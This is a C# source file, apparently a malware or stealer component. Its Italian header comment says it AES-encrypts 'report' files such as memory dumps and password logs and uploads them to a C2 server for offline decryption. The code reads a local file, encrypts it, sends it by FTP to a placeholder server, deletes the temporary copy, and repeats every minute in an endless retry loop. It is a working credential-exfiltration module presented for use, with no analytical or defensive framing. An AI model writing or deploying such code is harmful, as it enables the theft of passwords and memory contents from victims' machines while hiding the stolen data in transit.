using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Threading.Tasks;

/*Upload report criptato su FTP Si cifrano i file report (dump memoria, log password) con AES prima dell’upload C2 memorizza file cifrati che poi si decifreranno offline*/
public class FtpCryptoUploader
{
public static void UploadEncryptedReport(string localFilePath, string ftpUri, byte[] aesKey, byte[] aesIV)
{
    byte[] plainData = File.ReadAllBytes(localFilePath);
    byte[] encryptedData = AesEncrypt(plainData, aesKey, aesIV);

    string tempFile = localFilePath + ".enc";
    File.WriteAllBytes(tempFile, encryptedData);

    WebClient client = new WebClient();
    // You need to define 'username' and 'password' variables or pass them as parameters
    // Example:
    // client.Credentials = new NetworkCredential("yourUsername", "yourPassword");
    client.UploadFile(ftpUri, tempFile);

    File.Delete(tempFile);
}

    // Funzione AES per cifrare/decifrare un byte array con chiave e IV
    public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new();
        using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }

    public static byte[] AesDecrypt(byte[] cipherText, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new(cipherText);
        using CryptoStream cryptoStream = new(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
        using MemoryStream resultStream = new();
        cryptoStream.CopyTo(resultStream);
        return resultStream.ToArray();
    }

    // Retry e logging senza password in chiaro
    // Esempio di log sicuro
    public static void SafeLog(string message)
    {
        string logPath = "agent_log.txt";
        string password = "s3cr3t"; // Example sensitive data
        string safeMsg = message.Replace(password, "***");
        File.AppendAllText(logPath, $"{DateTime.UtcNow:o} {safeMsg}\n");
    }

    // Main loop
    public static async Task MainLoopAsync()
    {
        string localReportPath = "report.txt";
        string ftpUri = "ftp://server/upload/report.enc";
        byte[] aesKey = new byte[32]; // Replace with actual key
        byte[] aesIv = new byte[16];  // Replace with actual IV
        int maxRetries = 3;
        int retryDelayMs = 2000;

        while (true)
        {
            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    UploadEncryptedReport(localReportPath, ftpUri, aesKey, aesIv);
                    SafeLog("Report uploaded successfully");
                    break;
                }
                catch (Exception ex)
                {
                    SafeLog($"Upload failed: {ex.Message}");
                    await Task.Delay(retryDelayMs);
                }
            }
            await Task.Delay(60000); // Wait before next upload
        }
    }
}